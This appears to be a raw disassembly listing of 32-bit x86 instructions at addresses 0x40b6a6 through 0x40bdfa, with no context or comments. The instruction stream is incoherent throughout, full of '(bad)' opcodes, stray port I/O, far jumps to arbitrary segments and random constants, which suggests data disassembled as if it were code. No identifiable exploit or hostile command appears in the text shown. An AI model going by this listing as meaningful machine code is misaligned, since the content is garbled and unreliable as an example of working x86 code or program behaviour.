  40b6a6:	sbb    DWORD PTR [eax],eax
  40b6a8:	inc    edx
  40b6a9:	stos   BYTE PTR es:[edi],al
  40b6aa:	ret    
  40b6ab:	cdq    
  40b6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6ad:	shr    BYTE PTR [ecx+eiz*8+0x27712e85],1
  40b6b4:	xchg   ebx,eax
  40b6b5:	aam    0xc2
  40b6b7:	add    DWORD PTR ds:0x4c832ae0,edi
  40b6bd:	mov    dl,0xa4
  40b6bf:	cmp    al,0x7d
  40b6c1:	fdivr  DWORD PTR [ebp+0x37]
  40b6c4:	dec    ebx
  40b6c5:	in     al,dx
  40b6c6:	mov    cl,0x2a
  40b6c8:	cmp    DWORD PTR [eax-0xd],eax
  40b6cb:	daa    
  40b6cc:	pop    eax
  40b6cd:	out    dx,eax
  40b6ce:	repnz xor BYTE PTR [edi],bl
  40b6d1:	cmp    ch,BYTE PTR [esi]
  40b6d3:	je     0x40b6fb
  40b6d5:	and    ah,BYTE PTR [ebp+0x10]
  40b6d8:	dec    ecx
  40b6d9:	aam    0xf1
  40b6db:	mov    DWORD PTR [edx+0x1b],edx
  40b6de:	leave  
  40b6df:	shr    DWORD PTR ss:[edi+0x24458908],0xf8
  40b6e7:	ss dec edi
  40b6e9:	mov    eax,ds:0xa206d7b7
  40b6ee:	xor    ch,dl
  40b6f0:	loope  0x40b709
  40b6f2:	jo     0x40b6ea
  40b6f4:	ins    DWORD PTR es:[edi],dx
  40b6f5:	jl     0x40b6b9
  40b6f7:	rcl    BYTE PTR [ecx-0x34],1
  40b6fa:	or     dl,BYTE PTR ds:0x9ed98ee2
  40b700:	mov    DWORD PTR [eax+0x2],eax
  40b703:	sbb    eax,0x96c0021f
  40b708:	mov    ds:0x2bda7f4b,eax
  40b70d:	jbe    0x40b6da
  40b70f:	sahf   
  40b710:	inc    BYTE PTR [eax-0x5c]
  40b713:	sub    eax,0xcc7f5cdd
  40b718:	push   ds
  40b719:	int3   
  40b71a:	in     al,dx
  40b71b:	ror    DWORD PTR [eax+0x7f0fd990],0x30
  40b722:	add    ch,BYTE PTR [ebp+0x7d]
  40b725:	call   0x7debd100
  40b72a:	xchg   ecx,eax
  40b72b:	loop   0x40b725
  40b72d:	outs   dx,DWORD PTR ds:[esi]
  40b72e:	adc    ah,BYTE PTR [ebx+eiz*1]
  40b731:	push   0x6966d586
  40b736:	fimul  WORD PTR [ecx-0x61ad2143]
  40b73c:	rcr    DWORD PTR [edx-0x6beb29d6],cl
  40b742:	fsubr  DWORD PTR [edi-0xec98bd4]
  40b748:	sub    BYTE PTR [ecx+0x75],al
  40b74b:	mov    BYTE PTR [ecx-0x1be6caba],dh
  40b751:	rol    BYTE PTR [edi],1
  40b753:	and    al,0x9
  40b755:	inc    esp
  40b756:	add    eax,0xa0fa5b16
  40b75b:	es jb  0x40b736
  40b75e:	es popf 
  40b760:	mov    bl,0x35
  40b762:	cmp    al,0x66
  40b764:	imul   eax,edi,0xfb1b79b
  40b76a:	cld    
  40b76b:	adc    al,BYTE PTR [eax+0x61]
  40b76e:	lock jmp 0x40b709
  40b771:	inc    esi
  40b772:	test   edx,0xa4a6b232
  40b778:	fsubr  st,st(2)
  40b77a:	in     al,0xb9
  40b77c:	out    0x68,eax
  40b77e:	add    al,0x92
  40b780:	dec    edx
  40b781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b782:	lock out 0x33,eax
  40b785:	retf   0xd65a
  40b788:	fcomip st,st(1)
  40b78a:	push   ss
  40b78b:	cmp    bh,BYTE PTR [esi+0x66]
  40b78e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78f:	or     bh,dh
  40b791:	fcomp  QWORD PTR gs:[ecx+0x7b]
  40b795:	dec    ebp
  40b796:	adc    edi,DWORD PTR [edx+0x2726a864]
  40b79c:	loopne 0x40b762
  40b79e:	sub    bh,BYTE PTR [ebx+0xb603fb0]
  40b7a4:	(bad)  
  40b7a5:	xor    BYTE PTR ds:0xd746a40c,0x1f
  40b7ac:	shl    DWORD PTR cs:[eax-0xd],0xf7
  40b7b1:	mov    ah,0xf3
  40b7b3:	aam    0x80
  40b7b5:	call   0xa748f8c0
  40b7ba:	in     eax,dx
  40b7bb:	ror    ah,0xa8
  40b7be:	ret    0xf7d8
  40b7c1:	cwde   
  40b7c2:	shl    DWORD PTR [ecx-0x47396ad7],cl
  40b7c8:	dec    esp
  40b7c9:	mov    bh,0xc5
  40b7cb:	cmp    eax,0xa0cd81fc
  40b7d0:	push   cs
  40b7d1:	sub    dh,bh
  40b7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d4:	(bad)  
  40b7d6:	sub    eax,0x4e3b5f74
  40b7db:	mov    edx,0x15c38a44
  40b7e0:	mov    ecx,0x693a283
  40b7e5:	loope  0x40b83f
  40b7e7:	pop    ebp
  40b7e8:	fst    DWORD PTR [edi+0x2c]
  40b7eb:	dec    edi
  40b7ec:	js     0x40b79c
  40b7ee:	xor    al,BYTE PTR [ecx+0x2a74c2f7]
  40b7f4:	fwait
  40b7f5:	mov    ebp,0xff1f730d
  40b7fa:	pop    edx
  40b7fb:	int    0xb6
  40b7fd:	into   
  40b7fe:	sbb    BYTE PTR [eax-0x77],dl
  40b801:	mov    DWORD PTR [eax],edi
  40b803:	jo     0x40b860
  40b805:	push   ebx
  40b806:	jmp    0x40b7da
  40b808:	sub    esi,esi
  40b80a:	push   esp
  40b80b:	and    DWORD PTR [ebx+0x7],esi
  40b80e:	pop    esp
  40b80f:	sub    ebx,edx
  40b811:	jecxz  0x40b80a
  40b813:	sub    eax,0x21bf3324
  40b818:	pop    es
  40b819:	cmp    al,0x2b
  40b81b:	push   esp
  40b81c:	lods   eax,DWORD PTR ds:[esi]
  40b81d:	out    dx,eax
  40b81e:	clc    
  40b81f:	sub    eax,0x399d5fd
  40b824:	enter  0x7a9c,0xa6
  40b828:	sbb    edi,eax
  40b82a:	inc    ecx
  40b82b:	fcmovu st,st(3)
  40b82d:	fnstenv [eax]
  40b82f:	iret   
  40b830:	fild   DWORD PTR [ebp-0x3b]
  40b833:	into   
  40b834:	adc    eax,esi
  40b836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b838:	fmul   DWORD PTR [ebx]
  40b83a:	and    eax,0x56132184
  40b83f:	xchg   edx,eax
  40b840:	(bad)  
  40b842:	lahf   
  40b843:	cmp    DWORD PTR [ecx+0x66],0x58
  40b847:	addr16 push ecx
  40b849:	jb     0x40b880
  40b84b:	sub    ecx,esi
  40b84d:	js     0x40b863
  40b84f:	push   0x996bf6ff
  40b854:	mov    ?,edi
  40b856:	mov    cl,0x14
  40b858:	xor    ecx,DWORD PTR [ecx-0x1e]
  40b85b:	rcr    BYTE PTR [edx+0x4e8739e3],0xc0
  40b862:	adc    al,0xef
  40b864:	mov    ebp,0xa3e226e1
  40b869:	jb     0x40b844
  40b86b:	xchg   ebp,eax
  40b86c:	dec    edx
  40b86d:	stos   DWORD PTR es:[edi],eax
  40b86e:	in     al,dx
  40b86f:	xor    DWORD PTR [ebx+eiz*4-0x27],edi
  40b873:	xchg   ebx,eax
  40b874:	out    dx,al
  40b875:	adc    ah,BYTE PTR [ecx]
  40b877:	sbb    edx,edx
  40b879:	cmc    
  40b87a:	iret   
  40b87b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b87c:	and    DWORD PTR [edi+ecx*1-0x32],edi
  40b880:	ins    DWORD PTR es:[edi],dx
  40b881:	cmp    al,0xe8
  40b883:	stos   DWORD PTR es:[edi],eax
  40b884:	jne    0x40b8d8
  40b886:	jp     0x40b887
  40b888:	fwait
  40b889:	jne    0x40b83d
  40b88b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b88c:	push   ebp
  40b88d:	(bad)  
  40b88e:	fucom  st(0)
  40b890:	(bad)  [ebp-0x7e3c128a]
  40b896:	push   ds
  40b897:	mov    ds:0x1ed7bf32,eax
  40b89c:	popf   
  40b89d:	pop    esi
  40b89e:	adc    al,0x3b
  40b8a0:	pop    ebx
  40b8a1:	xor    dh,al
  40b8a3:	pop    edi
  40b8a4:	and    eax,0xf0da1c75
  40b8a9:	xor    DWORD PTR es:[ebx+0x66a4b735],eax
  40b8b0:	int    0x9c
  40b8b2:	ror    ecx,1
  40b8b4:	adc    al,0x8b
  40b8b6:	ja     0x40b86d
  40b8b8:	push   es
  40b8b9:	pop    eax
  40b8ba:	test   bh,dl
  40b8bc:	ret    
  40b8bd:	lds    edx,FWORD PTR [ebp+0x7a]
  40b8c0:	aas    
  40b8c1:	add    dl,BYTE PTR [edi+0x7e1af062]
  40b8c7:	pop    ss
  40b8c8:	pusha  
  40b8c9:	mov    DWORD PTR [ebx],esi
  40b8cb:	mov    ebp,0x3ee63dc1
  40b8d0:	shl    DWORD PTR [ebx-0x7d05ece9],cl
  40b8d6:	mov    bl,BYTE PTR [esi+0x2c]
  40b8d9:	mov    bh,0x6e
  40b8db:	bswap  eax
  40b8dd:	shl    BYTE PTR [edi],0xa
  40b8e0:	dec    edi
  40b8e1:	inc    edi
  40b8e2:	pop    edx
  40b8e3:	cmp    BYTE PTR [ecx-0x7270a3b7],0xc6
  40b8ea:	arpl   si,di
  40b8ec:	mov    BYTE PTR [ecx],bh
  40b8ee:	ds mov dl,0xde
  40b8f1:	or     DWORD PTR ds:0x3379ea79,0x4f9db67f
  40b8fb:	div    DWORD PTR [edi+0x77]
  40b8fe:	popa   
  40b8ff:	repz sbb edx,DWORD PTR [eax]
  40b902:	aas    
  40b903:	mov    ah,0x2e
  40b905:	cld    
  40b906:	push   0xffffff89
  40b908:	xor    al,0xe2
  40b90a:	mov    esi,DWORD PTR [ebp+ecx*8-0x76bdb95c]
  40b911:	outs   dx,BYTE PTR ds:[esi]
  40b912:	gs and al,0x4e
  40b915:	(bad)  
  40b916:	sbb    edi,DWORD PTR [bx+di]
  40b919:	das    
  40b91a:	call   0x42a7f842
  40b91f:	xchg   esi,eax
  40b920:	mov    BYTE PTR [eax],0xe8
  40b923:	out    0xe0,al
  40b925:	stc    
  40b926:	and    cl,BYTE PTR [edx-0x6638ad9]
  40b92c:	loop   0x40b8de
  40b92e:	mov    cl,0x6a
  40b930:	push   es
  40b931:	iret   
  40b932:	xchg   BYTE PTR [edi-0x64e62c23],ch
  40b938:	adc    eax,0xe586f325
  40b93d:	int    0xc4
  40b93f:	push   ss
  40b940:	xor    ebx,ebx
  40b942:	cmp    al,0x3b
  40b944:	add    BYTE PTR [edi-0x18095cd9],ch
  40b94a:	add    eax,0x33016bd7
  40b94f:	cli    
  40b950:	or     BYTE PTR [esp-0x52],ah
  40b954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b955:	push   ecx
  40b956:	mov    ebp,DWORD PTR [ebx+0x22]
  40b959:	icebp  
  40b95a:	clc    
  40b95b:	add    BYTE PTR [edi],ah
  40b95d:	mov    ah,0x27
  40b95f:	jno    0x40b999
  40b961:	int3   
  40b962:	push   es
  40b963:	jno    0x40b8f8
  40b965:	mov    ah,0x86
  40b967:	xor    DWORD PTR ds:0xb5f7e383,0xb15394f6
  40b971:	ret    0x2b1c
  40b974:	sbb    BYTE PTR [edi-0x4f8acc64],0xe6
  40b97b:	loope  0x40b96d
  40b97d:	lahf   
  40b97e:	fcomip st,st(4)
  40b980:	mov    ch,0xc0
  40b982:	fnstenv [esp+ecx*1-0x776db19e]
  40b989:	push   0x1d221d4
  40b98e:	pop    esi
  40b98f:	xor    DWORD PTR [edx+ebx*1-0x27c8235f],esi
  40b996:	jae    0x40b9a5
  40b998:	aad    0x56
  40b99a:	(bad)  
  40b99b:	in     al,dx
  40b99c:	push   cs
  40b99d:	or     BYTE PTR [edi-0x52],0x84
  40b9a1:	bound  edx,QWORD PTR [ebx+0x25]
  40b9a4:	add    al,0x34
  40b9a6:	xlat   BYTE PTR ds:[ebx]
  40b9a7:	sahf   
  40b9a8:	push   edx
  40b9a9:	sbb    eax,ebx
  40b9ab:	aas    
  40b9ac:	mov    BYTE PTR [esi+0x57],bh
  40b9af:	out    0xbf,al
  40b9b1:	inc    esp
  40b9b2:	push   edx
  40b9b3:	adc    dl,BYTE PTR [edx]
  40b9b5:	xchg   edi,eax
  40b9b6:	xchg   ecx,eax
  40b9b7:	les    ebx,FWORD PTR [eax]
  40b9b9:	daa    
  40b9ba:	mov    ecx,0xdf491ee8
  40b9bf:	adc    ecx,DWORD PTR [ecx+0x4a]
  40b9c2:	imul   ebp,DWORD PTR [ebx+0x3],0x34352933
  40b9c9:	or     BYTE PTR [edi+0x40],al
  40b9cc:	lock mov ch,0x1c
  40b9cf:	scas   al,BYTE PTR es:[edi]
  40b9d0:	(bad)  
  40b9d1:	push   0xfffffffb
  40b9d3:	dec    ebp
  40b9d4:	pop    ecx
  40b9d5:	mov    ah,0xc1
  40b9d7:	int3   
  40b9d8:	xor    BYTE PTR [esi],ah
  40b9da:	aaa    
  40b9db:	sbb    esp,ebx
  40b9dd:	inc    ecx
  40b9de:	sub    DWORD PTR [edi],edi
  40b9e0:	mov    edx,0xbe76d7e6
  40b9e5:	inc    ecx
  40b9e6:	icebp  
  40b9e7:	addr16 arpl di,cx
  40b9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9eb:	das    
  40b9ec:	xchg   esi,eax
  40b9ed:	mov    DWORD PTR [edx+ebx*2-0x6c479cf5],esp
  40b9f4:	in     al,dx
  40b9f5:	pop    edi
  40b9f6:	jmp    0x40ba10
  40b9f8:	xor    eax,0x7e78d27c
  40b9fd:	xchg   esi,eax
  40b9fe:	pusha  
  40b9ff:	mov    edx,0x641e6751
  40ba04:	jnp    0x40ba21
  40ba06:	mov    bh,dh
  40ba08:	neg    BYTE PTR [esi]
  40ba0a:	aaa    
  40ba0b:	dec    edi
  40ba0c:	stc    
  40ba0d:	pop    ebx
  40ba0e:	xor    al,0xec
  40ba10:	push   edx
  40ba11:	cld    
  40ba12:	outs   dx,DWORD PTR ds:[esi]
  40ba13:	mov    ebp,0x11ecf9a5
  40ba18:	xchg   ebx,eax
  40ba19:	jae    0x40b9d7
  40ba1b:	pop    esp
  40ba1c:	mov    eax,ds:0x5d993502
  40ba21:	test   eax,0xe6f2aa2a
  40ba26:	adc    al,0xb9
  40ba28:	xchg   edx,eax
  40ba29:	mov    BYTE PTR [ecx-0x33],ah
  40ba2c:	sub    esp,edx
  40ba2e:	je     0x40b9dc
  40ba30:	leave  
  40ba31:	(bad)  
  40ba32:	(bad)  
  40ba33:	cmp    esp,DWORD PTR [edx+0x0]
  40ba36:	aaa    
  40ba37:	xchg   esp,eax
  40ba38:	jmp    0x46dfade6
  40ba3d:	loope  0x40ba3d
  40ba3f:	xchg   BYTE PTR [ecx],bl
  40ba41:	push   ebx
  40ba42:	(bad)  
  40ba43:	div    bl
  40ba45:	out    dx,al
  40ba46:	ds mov dh,0x71
  40ba49:	pop    ss
  40ba4a:	jle    0x40baa8
  40ba4c:	and    BYTE PTR [esi-0x7f77a364],ah
  40ba52:	or     BYTE PTR [edi+0x32],ah
  40ba55:	in     eax,0xa6
  40ba57:	ins    BYTE PTR es:[edi],dx
  40ba58:	jmp    0x40bad3
  40ba5a:	jg     0x40ba36
  40ba5c:	inc    ecx
  40ba5d:	gs push es
  40ba5f:	lea    esp,[ebp-0x51]
  40ba62:	push   es
  40ba63:	mov    edi,0xeea67424
  40ba68:	mov    eax,0x2cf99fc1
  40ba6d:	jbe    0x40ba59
  40ba6f:	mov    eax,0x38058b72
  40ba74:	mov    al,0xbd
  40ba76:	mov    edx,0xb5872cde
  40ba7b:	add    DWORD PTR [edi+0x2d9b85d7],ecx
  40ba81:	push   ebp
  40ba82:	call   0x5b72:0x8aa14f1
  40ba89:	sbb    BYTE PTR [edi],cl
  40ba8b:	ss sahf 
  40ba8d:	mov    ah,0x70
  40ba8f:	stc    
  40ba90:	ja     0x40ba71
  40ba92:	jns    0x40ba8f
  40ba94:	jb     0x40ba16
  40ba96:	jle    0x40ba4a
  40ba98:	lods   eax,DWORD PTR ds:[esi]
  40ba99:	test   BYTE PTR [ecx+0x7df98901],0x43
  40baa0:	mov    cl,0x26
  40baa2:	jo     0x40bb1b
  40baa4:	loope  0x40baf5
  40baa6:	and    eax,0x2093b650
  40baab:	mov    eax,0xd8541cd8
  40bab0:	repz loop 0x40babe
  40bab3:	lods   eax,DWORD PTR ds:[esi]
  40bab4:	and    BYTE PTR [ebx],cl
  40bab6:	adc    eax,esi
  40bab8:	sub    eax,0x7e56f5ce
  40babd:	mov    eax,0xf70e01b8
  40bac2:	jns    0x40bb19
  40bac4:	enter  0x1d1d,0xd3
  40bac8:	in     al,0x75
  40baca:	js     0x40bb24
  40bacc:	jl     0x40bab2
  40bace:	in     eax,0x96
  40bad0:	mov    esi,es
  40bad2:	pop    esp
  40bad3:	(bad)  
  40bad4:	jb     0x40ba6f
  40bad6:	push   edi
  40bad7:	ja     0x40bb00
  40bad9:	popf   
  40bada:	mul    DWORD PTR [esi]
  40badc:	retf   
  40badd:	add    BYTE PTR [esi+0x61],0x61
  40bae1:	clc    
  40bae2:	push   eax
  40bae3:	pop    edx
  40bae4:	cmp    dl,al
  40bae6:	inc    ebp
  40bae7:	inc    edx
  40bae8:	cmc    
  40bae9:	hlt    
  40baea:	push   ecx
  40baeb:	sub    BYTE PTR [edi],al
  40baed:	xchg   esp,eax
  40baee:	sahf   
  40baef:	(bad)  
  40baf0:	loopne 0x40ba76
  40baf2:	adc    edx,edx
  40baf4:	in     eax,0x95
  40baf6:	dec    eax
  40baf7:	push   es
  40baf8:	ds and BYTE PTR gs:[edi-0x4b],bh
  40bafd:	rol    ah,0x56
  40bb00:	sbb    BYTE PTR [esi-0x105c11fb],cl
  40bb06:	es cld 
  40bb08:	pop    esp
  40bb09:	push   0x74ea5bfe
  40bb0e:	sub    edi,DWORD PTR [edx]
  40bb10:	sti    
  40bb11:	cmp    BYTE PTR [ebx+eax*2+0x34df707c],dl
  40bb18:	xchg   DWORD PTR [edx-0x245c25c4],eax
  40bb1e:	mov    ecx,0x1f427263
  40bb23:	xchg   esi,eax
  40bb24:	cmp    edi,DWORD PTR [ebp-0x41]
  40bb27:	seto   ah
  40bb2a:	xlat   BYTE PTR ds:[ebx]
  40bb2b:	mov    esp,0x318ad398
  40bb30:	das    
  40bb31:	push   0xfffffffc
  40bb33:	pop    ss
  40bb34:	and    al,0xe2
  40bb36:	test   DWORD PTR [edi-0x30],esp
  40bb39:	inc    edx
  40bb3a:	fs fadd st(4),st
  40bb3d:	pop    es
  40bb3e:	mov    ds:0x73697b88,al
  40bb43:	ret    0x9bd2
  40bb46:	push   edi
  40bb47:	mov    WORD PTR [ecx],?
  40bb49:	cli    
  40bb4a:	add    esp,edx
  40bb4c:	mov    es,eax
  40bb4e:	jge    0x40bb7b
  40bb50:	cli    
  40bb51:	icebp  
  40bb52:	jle    0x40bb50
  40bb54:	in     eax,dx
  40bb55:	jmp    0xe3f1:0x95218aa9
  40bb5c:	dec    edx
  40bb5d:	int    0x37
  40bb5f:	out    0x2b,al
  40bb61:	test   BYTE PTR [esi],bh
  40bb63:	or     al,0x79
  40bb65:	lahf   
  40bb66:	nop
  40bb67:	add    BYTE PTR [ebp+edx*8+0x55],dl
  40bb6b:	mov    edx,0x370ccc0c
  40bb70:	out    0x22,eax
  40bb72:	jmp    0xbef4508b
  40bb77:	mov    dl,0x3f
  40bb79:	test   esi,esi
  40bb7b:	popa   
  40bb7c:	fcom   QWORD PTR [edx+0x5ebc7f33]
  40bb82:	aas    
  40bb83:	fsub   st(6),st
  40bb85:	inc    esp
  40bb86:	push   esi
  40bb87:	fwait
  40bb88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb89:	cmp    al,0xfe
  40bb8b:	int3   
  40bb8c:	mov    dh,0x9a
  40bb8e:	aad    0x5b
  40bb90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb91:	push   0x6c8e8f98
  40bb96:	jo     0x40bbba
  40bb98:	fcomp  DWORD PTR [edx]
  40bb9a:	outs   dx,DWORD PTR ds:[esi]
  40bb9b:	aam    0xbf
  40bb9d:	shl    BYTE PTR [ecx+0x57],0xf5
  40bba1:	int3   
  40bba2:	add    bh,BYTE PTR ds:0x2ce300cf
  40bba8:	out    0xb8,eax
  40bbaa:	into   
  40bbab:	enter  0xa3db,0xe1
  40bbaf:	fs xchg esi,eax
  40bbb1:	jne    0x40bba7
  40bbb3:	retf   0x6221
  40bbb6:	mov    edx,0x7c340bdb
  40bbbb:	repnz pop esi
  40bbbd:	in     al,0x33
  40bbbf:	dec    ebx
  40bbc0:	adc    al,0x51
  40bbc2:	test   al,0xe3
  40bbc4:	inc    ecx
  40bbc5:	dec    eax
  40bbc6:	cmp    BYTE PTR [ebx+0x31f631b6],cl
  40bbcc:	ins    DWORD PTR es:[edi],dx
  40bbcd:	je     0x40bb99
  40bbcf:	jg     0x40bb85
  40bbd1:	scas   eax,DWORD PTR es:[edi]
  40bbd2:	cld    
  40bbd3:	rcr    eax,0xdf
  40bbd6:	mov    ecx,0x196dc8c
  40bbdb:	(bad)  
  40bbdd:	sbb    DWORD PTR [ebp-0x6b03430a],ebp
  40bbe3:	jg     0x40bc2d
  40bbe5:	mov    es,ecx
  40bbe7:	(bad)  
  40bbe8:	fisttp QWORD PTR [edi]
  40bbea:	cmp    bl,BYTE PTR [edi]
  40bbec:	mov    ebx,0xe7b12458
  40bbf1:	inc    edx
  40bbf2:	loope  0x40bbb3
  40bbf4:	popa   
  40bbf5:	imul   edi,DWORD PTR ds:0xc9ab2fcc,0x7e
  40bbfc:	repnz push ds
  40bbfe:	call   FWORD PTR [edx+0x2f1a686]
  40bc04:	lds    ebp,FWORD PTR [esi+0x2]
  40bc07:	jno    0x40bc6b
  40bc09:	inc    eax
  40bc0a:	out    dx,eax
  40bc0b:	jge    0x40bbfd
  40bc0d:	xchg   BYTE PTR [ebx-0xe232c48],al
  40bc13:	std    
  40bc14:	mov    ebx,0x93361e3
  40bc19:	mov    cl,0xd4
  40bc1b:	inc    eax
  40bc1c:	test   eax,0x40c1131b
  40bc21:	push   0xfb3a4a84
  40bc26:	stos   DWORD PTR es:[edi],eax
  40bc27:	jne    0x40bc84
  40bc29:	or     esp,ebp
  40bc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc2c:	xchg   esp,eax
  40bc2d:	jb     0x40bc1d
  40bc2f:	jno    0x40bc9b
  40bc31:	lea    edx,[ebx+0x485a9e2a]
  40bc37:	ficom  WORD PTR [ecx+0x4b]
  40bc3a:	ja     0x40bc7f
  40bc3c:	lea    esp,[ebx+0x6f]
  40bc3f:	dec    eax
  40bc40:	mov    DWORD PTR [eax],esi
  40bc42:	mov    eax,0xc4d5c7d2
  40bc47:	scas   eax,DWORD PTR es:[edi]
  40bc48:	push   es
  40bc49:	sbb    BYTE PTR [eax+0x7996905a],cl
  40bc4f:	adc    DWORD PTR [ecx+0x7f0b12e],0xffffffb8
  40bc56:	cmp    esi,DWORD PTR [esi-0x2331c1a3]
  40bc5c:	pop    ss
  40bc5d:	hlt    
  40bc5e:	lds    ebp,FWORD PTR [esi+0x5e]
  40bc61:	mov    dh,0x39
  40bc63:	cwde   
  40bc64:	or     eax,0xd7858adb
  40bc69:	ficom  DWORD PTR [edi]
  40bc6b:	cli    
  40bc6c:	jg     0x40bc68
  40bc6e:	dec    eax
  40bc6f:	dec    ebp
  40bc70:	fucom  st(4)
  40bc72:	mov    edx,0x759f50e1
  40bc77:	add    eax,0x518f0966
  40bc7c:	aaa    
  40bc7d:	js     0x40bc30
  40bc7f:	ret    0x8d39
  40bc82:	cwde   
  40bc83:	pop    edx
  40bc84:	popa   
  40bc85:	cmp    dh,BYTE PTR [ebp+eiz*2-0x25bb9a7d]
  40bc8c:	mov    ebx,0xb7d0de9c
  40bc91:	aas    
  40bc92:	cmp    al,0x49
  40bc94:	ins    DWORD PTR es:[edi],dx
  40bc95:	jmp    0xf496:0x275c7e46
  40bc9c:	ret    0xcdee
  40bc9f:	inc    ebp
  40bca0:	icebp  
  40bca1:	inc    edx
  40bca2:	in     al,0x67
  40bca4:	mov    eax,0x5950f0e
  40bca9:	sti    
  40bcaa:	ja     0x40bd20
  40bcac:	pop    eax
  40bcad:	pop    edi
  40bcae:	daa    
  40bcaf:	xor    DWORD PTR ds:0x4fbb9c4b,esp
  40bcb5:	aam    0xd4
  40bcb7:	popf   
  40bcb8:	mov    ch,0xa0
  40bcba:	adc    bh,BYTE PTR [eax]
  40bcbc:	outs   dx,BYTE PTR ds:[esi]
  40bcbd:	jns    0x40bd33
  40bcbf:	cmp    edx,edi
  40bcc1:	es sahf 
  40bcc3:	clc    
  40bcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc5:	inc    eax
  40bcc6:	add    ebp,edi
  40bcc8:	mov    ah,0x30
  40bcca:	imul   edi,DWORD PTR ds:[ecx+ecx*4+0x43],0x1d003835
  40bcd3:	loopne 0x40bc97
  40bcd5:	mov    eax,ds:0xfc535dfc
  40bcda:	lock push edx
  40bcdc:	push   ss
  40bcdd:	fs into 
  40bcdf:	mov    al,ds:0xab6bfbe8
  40bce4:	in     eax,dx
  40bce5:	mov    cl,0x5
  40bce7:	adc    DWORD PTR [ebx+0x5c],esp
  40bcea:	add    DWORD PTR [ebp-0x25],eax
  40bced:	lock or bh,BYTE PTR [edx]
  40bcf0:	sub    edi,DWORD PTR [edx]
  40bcf2:	add    eax,0x5cfd811
  40bcf7:	jbe    0x40bd32
  40bcf9:	xor    edi,esp
  40bcfb:	es jecxz 0x40bd0d
  40bcfe:	call   0xd6d06cb
  40bd03:	out    0xa7,al
  40bd05:	and    DWORD PTR [esi-0x574f8f1],edi
  40bd0b:	adc    BYTE PTR [edi],dl
  40bd0d:	jg     0x40bcf8
  40bd0f:	rcl    BYTE PTR [edi],1
  40bd11:	xor    cl,dh
  40bd13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd14:	pop    esi
  40bd15:	sub    DWORD PTR [ecx],ebx
  40bd17:	mov    DWORD PTR [esi+0x6ff76e4c],esp
  40bd1d:	jae    0x40bd65
  40bd1f:	imul   DWORD PTR [edx+0x2d1afe3c]
  40bd25:	mov    DWORD PTR ds:0x3d440fb5,ebp
  40bd2b:	loope  0x40bd12
  40bd2d:	adc    eax,0x9d453cf6
  40bd32:	pushf  
  40bd33:	leave  
  40bd34:	leave  
  40bd35:	loope  0x40bd69
  40bd37:	scas   al,BYTE PTR es:[edi]
  40bd38:	enter  0x5e46,0xcb
  40bd3c:	daa    
  40bd3d:	dec    esi
  40bd3e:	mov    esp,0xb4534b64
  40bd43:	xor    ecx,ebx
  40bd45:	cmp    cl,BYTE PTR [ebx-0x1]
  40bd48:	repz adc ebp,DWORD PTR [edx-0x3b]
  40bd4c:	add    DWORD PTR [esi+0x15e1c394],esi
  40bd52:	fcomi  st,st(5)
  40bd54:	push   ebx
  40bd55:	sbb    cl,BYTE PTR [edi]
  40bd57:	or     eax,0x86a923
  40bd5c:	mov    ebx,?
  40bd5e:	sbb    ecx,DWORD PTR [ebp-0x33]
  40bd61:	mov    edx,0x21fe7290
  40bd66:	jl     0x40bcfd
  40bd68:	popf   
  40bd69:	and    eax,0x12dfcd82
  40bd6e:	adc    ebp,DWORD PTR [edx+0x2d]
  40bd71:	ja     0x40bd4e
  40bd73:	mov    edi,0xacbbf366
  40bd78:	cs mov bh,0xf0
  40bd7b:	fwait
  40bd7c:	loopne 0x40bd36
  40bd7e:	pop    ds
  40bd7f:	into   
  40bd80:	sub    al,0xfc
  40bd82:	repnz pop edi
  40bd84:	aas    
  40bd85:	cmp    BYTE PTR [ebx+ebp*4-0x16],ch
  40bd89:	rcr    DWORD PTR [ebx],0x5
  40bd8c:	pop    ss
  40bd8d:	pop    ebx
  40bd8e:	ffreep st(1)
  40bd90:	icebp  
  40bd91:	sbb    BYTE PTR [edx+0x73],0x4d
  40bd95:	aas    
  40bd96:	add    ch,BYTE PTR [edi-0x310b930c]
  40bd9c:	lea    edi,[edx+0x7aae3698]
  40bda2:	hlt    
  40bda3:	and    esp,DWORD PTR [esp+ecx*2-0x63]
  40bda7:	cli    
  40bda8:	dec    edx
  40bda9:	inc    edi
  40bdaa:	in     eax,dx
  40bdab:	(bad)  
  40bdac:	push   ebx
  40bdad:	imul   esp,DWORD PTR [ebx-0x10537835],0x5bc9c0c2
  40bdb7:	xor    eax,DWORD PTR ds:0x8b090f6d
  40bdbd:	push   ebx
  40bdbe:	jg     0x40be05
  40bdc0:	mov    esp,0x7bca02b8
  40bdc5:	outs   dx,BYTE PTR ds:[esi]
  40bdc6:	cmc    
  40bdc7:	cmp    BYTE PTR [ebx-0x4f],cl
  40bdca:	(bad)  
  40bdcb:	lods   al,BYTE PTR ds:[esi]
  40bdcc:	dec    ch
  40bdce:	xor    edx,0x23
  40bdd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdd2:	mov    ds:0x35e5e6a9,eax
  40bdd7:	dec    esp
  40bdd8:	xor    al,0x44
  40bdda:	mov    eax,DWORD PTR [esi-0x68c26014]
  40bde0:	(bad)  
  40bde1:	call   0x690ed9db
  40bde6:	jecxz  0x40be5f
  40bde8:	inc    eax
  40bde9:	aam    0x4e
  40bdeb:	xchg   DWORD PTR [esi+0x6b0814f5],eax
  40bdf1:	adc    eax,0x4455d513
  40bdf6:	push   esp
  40bdf7:	fnstenv [eax+0x2a]
  40bdfa:	pop    eax
